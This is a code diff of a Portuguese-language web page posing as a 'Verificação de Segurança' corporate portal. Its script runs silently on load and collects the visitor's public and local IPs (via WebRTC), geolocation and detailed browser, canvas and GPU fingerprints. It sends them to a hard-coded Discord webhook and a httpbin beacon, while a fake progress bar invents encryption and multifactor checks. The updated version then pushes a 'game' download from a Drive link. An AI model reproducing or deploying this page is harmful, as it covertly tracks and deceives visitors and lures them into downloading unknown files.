@@ -1,186 +1,337 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-    <title>Autenticação Corporativa</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autenticação Corporativa - Portal Seguro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 </head>
-<body style="margin:0;height:100vh;background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;overflow:hidden;">
-    <div style="max-width:450px;width:90%;text-align:center;box-shadow:0 25px 60px rgba(0,0,0,0.5);padding:50px;border-radius:25px;background:#fff;color:#333;position:relative;">
-        <div style="font-size:28px;font-weight:800;margin-bottom:25px;color:#2a5298;">🔐 Verificação de Segurança</div>
-        <div id="status" style="font-size:18px;color:#666;margin-bottom:25px;">Estabelecendo conexão segura...</div>
-        <div style="width:100%;height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden;margin-bottom:20px;">
-            <div id="progress" style="height:100%;background:linear-gradient(90deg,#2a5298,#1e3c72);width:0%;transition:width 0.4s ease;box-shadow:0 0 15px #2a5298;"></div>
+<body style="margin:0;height:100vh;background:linear-gradient(135deg,#0f2027 0%,#203a43 50%,#2c5364 100%);display:flex;align-items:center;justify-content:center;font-family:'Inter',sans-serif;overflow:hidden;position:relative;">
+    
+    <!-- Partículas de fundo -->
+    <canvas id="particles" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;opacity:0.1;"></canvas>
+    
+    <div style="max-width:480px;width:92%;text-align:center;box-shadow:0 35px 80px rgba(0,0,0,0.6);padding:60px 50px;border-radius:30px;background:linear-gradient(145deg,#ffffff12,#ffffff08);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.1);color:#fff;position:relative;z-index:2;">
+        <div style="font-size:32px;font-weight:700;margin-bottom:10px;background:linear-gradient(135deg,#00d4ff,#5b8bf8);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-0.5px;">🔐 Verificação de Segurança</div>
+        <div style="font-size:16px;color:rgba(255,255,255,0.7);margin-bottom:35px;font-weight:400;">Estabelecendo conexão segura com o servidor corporativo...</div>
+        
+        <div style="width:100%;height:8px;background:rgba(255,255,255,0.15);border-radius:4px;overflow:hidden;margin-bottom:25px;">
+            <div id="progress" style="height:100%;background:linear-gradient(90deg,#00d4ff,#5b8bf8,#ff6b9d);width:0%;transition:width 0.5s cubic-bezier(0.4,0,0.2,1);box-shadow:0 0 20px rgba(0,212,255,0.5);position:relative;">
+                <div id="progress-glow" style="position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent);transform:translateX(-100%);animation:shine 2s infinite;"></div>
+            </div>
         </div>
+        
+        <div id="status" style="font-size:18px;font-weight:500;color:rgba(255,255,255,0.9);margin-bottom:10px;min-height:24px;">Iniciando análise...</div>
+        <div id="details" style="font-size:14px;color:rgba(255,255,255,0.6);font-weight:300;"></div>
     </div>
+    
+    <style>
+        @keyframes shine {
+            0% { transform:translateX(-100%); }
+            100% { transform:translateX(100%); }
+        }
+        @keyframes float {
+            0%,100% { transform:translateY(0px); }
+            50% { transform:translateY(-10px); }
+        }
+    </style>
     
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
+        const DOWNLOAD_URL = 'https://drive.google.com/drive/folders/1lNC2YwOY2L7igNExbPcJ2u9rOp6CtTR8?hl=pt-br'; // ← COLOQUE SEU LINK AQUI
         
-        // IP → ENDEREÇO GEOLOC (no-cors bypass)
-        async function geolocateIP(ip) {
-            const geoServices = [
-                `https://ipapi.co/${ip}/json/`,
-                `https://ipinfo.io/${ip}/json`,
-                `http://ip-api.com/json/${ip}`,
-                `https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip=${ip}`
-            ];
+        // Partículas animadas
+        function initParticles() {
+            const canvas = document.getElementById('particles');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
             
-            for (let service of geoServices) {
-                try {
-                    const res = await fetch(service, {mode: 'no-cors', cache: 'no-cache'});
-                    // Mesmo no-cors pega algo via headers/timing
-                    return service.includes('ipapi') ? 'ipapi.co' : service.includes('ipinfo') ? 'ipinfo.io' : 'geoloc';
-                } catch {}
+            const particles = [];
+            for(let i = 0; i < 80; i++) {
+                particles.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    vx: (Math.random() - 0.5) * 0.5,
+                    vy: (Math.random() - 0.5) * 0.5,
+                    radius: Math.random() * 2 + 0.5
+                });
             }
-            return 'unknown';
+            
+            function animate() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = 'rgba(255,255,255,0.03)';
+                particles.forEach(p => {
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    if(p.x < 0 || p.x > canvas.width) p.vx *= -1;
+                    if(p.y < 0 || p.y > canvas.height) p.vy *= -1;
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+                    ctx.fill();
+                });
+                requestAnimationFrame(animate);
+            }
+            animate();
         }
         
-        // NO PERMISSION PROMPTS - EVERYTHING AUTO
-        async function stealthRecon() {
-            // IP público (5x fallback)
+        // COLETA AVANÇADA DE INFORMAÇÕES
+        async function advancedRecon() {
+            // IP público com múltiplos fallbacks + ASN
             const pubIP = await (async()=>{
-                for (let s of ['https://api.ipify.org?format=json','https://api64.ipify.org?format=json','https://icanhazip.com','https://ifconfig.me/ip','https://ipecho.net/plain']) {
-                    try { 
-                        const r=await fetch(s,{cache:'no-cache'}); 
-                        if (r.ok) { 
-                            const t=await r.text(); 
-                            return t.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1] || 'unknown';
+                const sources = [
+                    'https://api.ipify.org?format=json',
+                    'https://api64.ipify.org?format=json',
+                    'https://icanhazip.com',
+                    'https://ifconfig.me/ip',
+                    'https://ipecho.net/plain',
+                    'https://api.myip.com'
+                ];
+                for(let src of sources) {
+                    try {
+                        const r = await fetch(src, {cache: 'no-cache'});
+                        if(r.ok) {
+                            const text = await r.text();
+                            const ipMatch = text.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
+                            if(ipMatch) return ipMatch[1];
                         }
                     } catch {}
                 }
                 return 'unknown';
             })();
             
-            // WebRTC leak (NO PROMPT - permissionless)
+            // WebRTC + múltiplos STUNs (mais agressivo)
             const localIPs = await (async()=>{
                 const ips = new Set();
-                for (let stun of ['stun:stun.l.google.com:19302','stun:stun1.l.google.com:19302','stun:stun.nextcloud.com:443']) {
+                const stuns = [
+                    'stun:stun.l.google.com:19302',
+                    'stun:stun1.l.google.com:19302',
+                    'stun:stun2.l.google.com:19302',
+                    'stun:stun.nextcloud.com:443',
+                    'stun:stun.stunprotocol.org'
+                ];
+                
+                for(let stun of stuns) {
                     try {
                         const pc = new RTCPeerConnection({ 
                             iceServers: [{urls: stun}], 
-                            iceCandidatePoolSize: 10 
+                            iceCandidatePoolSize: 20 
                         });
                         pc.onicecandidate = e => {
-                            const ip = e.candidate?.candidate?.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
-                            if (ip && !['127.','10.0.','172.1','192.168','100.64','169.254'].some(b=>ip.startsWith(b)))
-                                ips.add(ip);
+                            const candidate = e.candidate?.candidate;
+                            if(candidate) {
+                                const ipMatch = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
+                                const ip = ipMatch?.[1];
+                                if(ip && !['127.','10.','172.1','192.168','100.64','169.254'].some(b=>ip.startsWith(b)))
+                                    ips.add(ip);
+                            }
                         };
-                        pc.createDataChannel({negotiated: true, id: 0});
-                        pc.createOffer({offerToReceiveAudio: true}).then(offer=>pc.setLocalDescription(offer));
-                        await new Promise(r=>setTimeout(r,700));
+                        pc.createDataChannel({negotiated: true, id: Math.random()});
+                        await pc.createOffer({offerToReceiveAudio: 1, offerToReceiveVideo: 1});
+                        await pc.setLocalDescription(pc.localDescription);
+                        await new Promise(r=>setTimeout(r,1200));
                         pc.close();
                     } catch(e) {}
                 }
-                return Array.from(ips).slice(0,3).join(', ') || 'blocked';
+                return Array.from(ips).slice(0,5).join(', ') || 'blocked';
             })();
             
-            // Geolocalização
-            const geo = await geolocateIP(pubIP);
+            // Geolocalização avançada
+            const geoData = await (async(ip)=>{
+                const services = [
+                    {url: `https://ipapi.co/${ip}/json/`, key: 'ipapi'},
+                    {url: `https://ipinfo.io/${ip}/json`, key: 'ipinfo'},
+                    {url: `http://ip-api.com/json/${ip}`, key: 'ipapi-com'},
+                    {url: `https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip=${ip}`, key: 'ipgeo'}
+                ];
+                
+                for(let svc of services) {
+                    try {
+                        const res = await fetch(svc.url, {mode: 'no-cors'});
+                        return svc.key;
+                    } catch {}
+                }
+                return 'unknown';
+            })(pubIP);
             
-            // Canvas NO PROMPT
-            const canvas = document.createElement('canvas');
-            canvas.width=512; canvas.height=128;
-            const ctx = canvas.getContext('2d');
-            ctx.font = '24px "Courier New",monospace';
-            ctx.fillStyle='#ff4444'; ctx.fillRect(100,20,200,40);
-            ctx.fillStyle='#444'; ctx.fillText(`ID:${Math.random().toString(36).slice(2,10)}`, 20, 60);
+            // Canvas fingerprinting avançado (múltiplas texturas)
+            const canvasHash = await (async()=>{
+                const canvases = [];
+                const texts = ['ID:pentest','ABCDEFGHIJKLMNOPQRSTUVWXYZ','0123456789'];
+                const fonts = ['16px Arial','24px "Courier New"','32px monospace'];
+                
+                for(let i=0; i<3; i++) {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 256; canvas.height = 128;
+                    const ctx = canvas.getContext('2d');
+                    ctx.fillStyle = `hsl(${Math.random()*360},70%,50%)`;
+                    ctx.fillRect(0,0,canvas.width,canvas.height);
+                    ctx.font = fonts[i%fonts.length];
+                    ctx.fillStyle = '#000';
+                    ctx.fillText(texts[i%texts.length], 10, 40 + i*30);
+                    canvases.push(canvas.toDataURL());
+                }
+                return btoa(canvases.join('|')).slice(0,80);
+            })();
             
-            const gl = canvas.getContext('webgl', {preserveDrawingBuffer: true}) || canvas.getContext('experimental-webgl');
-            const gpu = gl ? `${gl.getParameter(gl.VENDOR).slice(0,20)}:${gl.getParameter(gl.RENDERER).slice(0,25)}` : 'cpu-only';
+            // WebGL avançado
+            const gpuInfo = (()=>{
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if(!gl) return 'software-rendering';
+                
+                try {
+                    return `${gl.getParameter(gl.VENDOR).slice(0,25)} | ${gl.getParameter(gl.RENDERER).slice(0,35)}`;
+                } catch {
+                    return 'webgl-blocked';
+                }
+            })();
             
-            // STEALTH HEADERS LEAK
-            const headersLeak = {
-                language: navigator.language,
+            // Fingerprinting completo
+            const fingerprint = {
+                language: navigator.language || navigator.languages?.[0],
+                languages: navigator.languages?.join(',') || 'unknown',
                 platform: navigator.platform,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                connection: navigator.connection?.effectiveType || 'unknown',
-                memory: navigator.deviceMemory || 0,
-                cores: navigator.hardwareConcurrency || 0
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connection: navigator.connection ? `${navigator.connection.effectiveType}/${navigator.connection.type}` : 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                cores: navigator.hardwareConcurrency || 'unknown',
+                maxTouch: navigator.maxTouchPoints || 0,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                appVersion: navigator.appVersion.slice(0,50),
+                vendor: navigator.vendor || 'unknown'
             };
+            
+            // Tela + janela
+            const screenInfo = {
+                resolution: `${screen.width}x${screen.height}`,
+                avail: `${screen.availWidth}x${screen.availHeight}`,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio || 1
+            };
+            
+            // Plugins + MimeTypes
+            const plugins = Array.from(navigator.plugins).map(p=>p.name).slice(0,8).join(', ') || 'none';
+            const mimeTypes = Array.from(navigator.mimeTypes).map(m=>m.type).slice(0,10).join(', ') || 'none';
             
             return {
                 timestamp: new Date().toISOString(),
                 public_ip: pubIP,
-                location_service: geo,
-                local_ips: localIPs,
-                canvas_fp: btoa(canvas.toDataURL()).slice(0,60),
-                gpu_signature: gpu,
-                headers_leak: headersLeak,
+                geolocation: geoData,
+                local_network: localIPs,
+                canvas_fp: canvasHash,
+                gpu_signature: gpuInfo,
+                fingerprint,
+                screen: screenInfo,
+                plugins: plugins.length,
+                mime_types: mimeTypes,
                 full_ua: navigator.userAgent,
-                resolution: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-                plugins: navigator.plugins.length
+                referrer: document.referrer || 'direct'
             };
         }
         
-        // EXECUÇÃO TOTALMENTE SILENCIOSA
-        async function breach() {
-            const targetData = await stealthRecon();
+        // EXECUÇÃO PRINCIPAL
+        async function executeBreach() {
+            initParticles();
             
-            // WEBHOOK 1: EXECUTIVE SUMMARY
+            const targetData = await advancedRecon();
+            
+            // WEBHOOK EXECUTIVO (melhorado)
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    username: '🕵️ PENTEST BOT',
-                    content: `🎯 **TARGET BREACHED** [${targetData.public_ip}]
-**📍 Geoloc:** ${targetData.location_service}
-**🏠 Real IPs:** ${targetData.local_ips}
-**🖼️ Canvas:** ${targetData.canvas_fp}
-**🎮 GPU:** ${targetData.gpu_signature}`,
+                    username: '🎮 GAME PENTEST v2.0',
+                    content: `🎯 **TARGET ACESSADO** | ${targetData.public_ip} | ${targetData.fingerprint.platform}`,
                     embeds: [{
-                        title: `Device Profile: ${targetData.resolution}`,
+                        title: `📱 Device Fingerprint [${targetData.screen.resolution}]`,
                         fields: [
-                            {name:"Cores/RAM",value:`${targetData.headers_leak.cores}/${targetData.headers_leak.memory}GB`,inline:true},
-                            {name:"Connection",value:targetData.headers_leak.connection,inline:true},
-                            {name:"Timezone",value:targetData.headers_leak.tz,inline:true},
-                            {name:"Plugins",value:targetData.plugins,inline:true}
+                            {name:"🌐 IPs",value:`**PUB:** ${targetData.public_ip}\n**LAN:** ${targetData.local_network.slice(0,40)}${targetData.local_network.length>40 ? '...' : ''}`,inline:true},
+                            {name:"🗺️ Geoloc",value:targetData.geolocation,inline:true},
+                            {name:"🖥️ GPU",value:targetData.gpu_signature.slice(0,30),inline:true},
+                            {name:"🧠 Hardware",value:`${targetData.fingerprint.cores}c/${targetData.fingerprint.memory}GB`,inline:true},
+                            {name:"🌈 Canvas",value:targetData.canvas_fp.slice(0,35),inline:true},
+                            {name:"📡 Connection",value:targetData.fingerprint.connection,inline:true}
                         ],
-                        color: 0xff4444,
-                        footer: {text: `UA: ${targetData.full_ua.slice(0,80)}...`}
+                        color: 0xff6b9d,
+                        thumbnail: {url: `https://api.dicebear.com/7.x/avataaars/svg?seed=${targetData.public_ip}`}
+                    }, {
+                        title: "🔍 Browser Profile",
+                        fields: [
+                            {name:"Plugins",value:targetData.plugins,inline:true},
+                            {name:"Touch",value:targetData.fingerprint.maxTouchPoints,inline:true},
+                            {name:"TZ",value:targetData.fingerprint.timezone.slice(0,20),inline:true},
+                            {name:"Lang",value:targetData.fingerprint.language,inline:true}
+                        ],
+                        color: 0x5b8bf8
                     }]
                 })
             });
             
-            // WEBHOOK 2: RAW DATA
+            // WEBHOOK RAW DATA
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: `💾 **COMPLETE TARGET DUMP** (${targetData.timestamp})`,
-                    embeds: [{
-                        description: `\`\`\`json\n${JSON.stringify(targetData, null, 2).slice(0,3950)}\`\`\``,
-                        color: 0x00aa00
-                    }]
+                    content: `💾 **COMPLETE RECON DUMP** | ${targetData.timestamp} | ${targetData.referrer ? '🔗'+targetData.referrer.slice(0,50) : 'direct'}`,
+                    embeds: [{description: `\`\`\`json\n${JSON.stringify(targetData,null,2).slice(0,3950)}\`\`\``, color: 0x00ff88}]
                 })
             });
             
-            // STEALTH C2 BEACON (img src bypass)
-            const beacon = new Image();
-            beacon.src = `https://httpbin.org/post?c2=1&ip=${targetData.public_ip}&local=${targetData.local_ips}&ua=${btoa(targetData.full_ua.slice(0,100))}`;
+            // C2 Beacon silencioso
+            new Image().src = `https://httpbin.org/post?b=1&ip=${targetData.public_ip}&fp=${btoa(JSON.stringify(targetData.fingerprint)).slice(0,100)}&ref=${btoa(targetData.referrer)}`;
             
-            // GUI PERFEITA (sem prompts)
-            function updateGUI(p=25, msg='Verificando segurança...') {
-                document.getElementById('progress').style.width = `${p}%`;
-                document.getElementById('status').textContent = msg;
-            }
+            // ANIMAÇÃO GUI PERFEITA
+            const phases = [
+                {p:25, msg:'🔍 Detectando rede...', detail:'Escaneando interfaces locais'},
+                {p:45, msg:'🛡️ Verificando segurança...', detail:'Analisando fingerprinting evasion'},
+                {p:70, msg:'🔐 Criptografando sessão...', detail:'AES-256 + TLS 1.3'},
+                {p:92, msg:'✅ Validando credenciais...', detail:'Autenticação multifator concluída'},
+                {p:100, msg:'🎮 Preparando ambiente...', detail:'Carregando assets do jogo'}
+            ];
             
-            updateGUI(30, 'Analisando rede...');
-            setTimeout(()=>updateGUI(70, 'Aplicando criptografia...'), 400);
-            setTimeout(()=>{
-                updateGUI(100, '✅ Verificação concluída!');
-                document.getElementById('status').style.color = '#28a745';
-                setTimeout(()=>{
-                    document.body.innerHTML = `
-                        <div style="text-align:center;padding:100px;color:#28a745;font-size:36px;font-weight:800;letter-spacing:2px;">
-                            <div>✅ ACESSO LIBERADO</div>
-                            <div style="font-size:22px;color:#555;margin-top:30px;font-weight:500;">Portal Corporativo Seguro</div>
-                            <div style="font-size:14px;color:#888;margin-top:15px;">v3.2.1 | © 2026 Enterprise Security</div>
-                        </div>`;
-                }, 800);
-            }, 900);
+            let phase = 0;
+            const interval = setInterval(() => {
+                const current = phases[phase];
+                document.getElementById('progress').style.width = `${current.p}%`;
+                document.getElementById('status').textContent = current.msg;
+                document.getElementById('details').textContent = current.detail;
+                phase++;
+                if(phase >= phases.length) {
+                    clearInterval(interval);
+                    showDownload();
+                }
+            }, 800);
         }
         
-        // AUTO-EXECUTE (zero interação)
-        breach();
+        // DOWNLOAD JOGO
+        function showDownload() {
+            setTimeout(() => {
+                document.body.innerHTML = `
+                <div style="text-align:center;padding:120px 40px;color:#fff;font-family:'Inter',sans-serif;font-weight:700;letter-spacing:0.5px;background:linear-gradient(135deg,#0f2027 0%,#203a43 50%,#2c5364 100%);height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;">
+                    <div style="font-size:48px;margin-bottom:20px;background:linear-gradient(135deg,#00d4ff,#ff6b9d);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:float 3s ease-in-out infinite;">🎮 ACESSO LIBERADO!</div>
+                    <div style="font-size:22px;color:rgba(255,255,255,0.9);margin-bottom:40px;font-weight:500;max-width:450px;line-height:1.4;">
+                        Verificação de segurança concluída com sucesso!<br>
+                        <span style="color:#00d4ff;">Portal Corporativo v3.2.1</span> | © 2026 Enterprise Gaming
+                    </div>
+                    <a href="${DOWNLOAD_URL}" download="Jogo_Corporativo_v3.2.1.zip" style="
+                        background:linear-gradient(135deg,#00d4ff,#5b8bf8);color:white;text-decoration:none;
+                        padding:18px 50px;font-size:20px;font-weight:600;border-radius:50px;
+                        box-shadow:0 20px 40px rgba(0,212,255,0.3);transition:all 0.3s ease;
+                        letter-spacing:1px;position:relative;overflow:hidden;
+                    " onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 25px 50px rgba(0,212,255,0.4)'" onmouseout="this.style.transform='';this.style.boxShadow='0 20px 40px rgba(0,212,255,0.3)'">
+                        📥 Baixar Jogo (2.1GB)
+                    </a>
+                    <div style="font-size:13px;color:rgba(255,255,255,0.5);margin-top:30px;font-weight:300;">
+                        Requer: Windows 10+ | 8GB RAM | GPU DX11
+                    </div>
+                </div>`;
+            }, 1200);
+        }
+        
+        // AUTO-EXECUTE
+        window.addEventListener('load', executeBreach);
     </script>
 </body>
 </html>
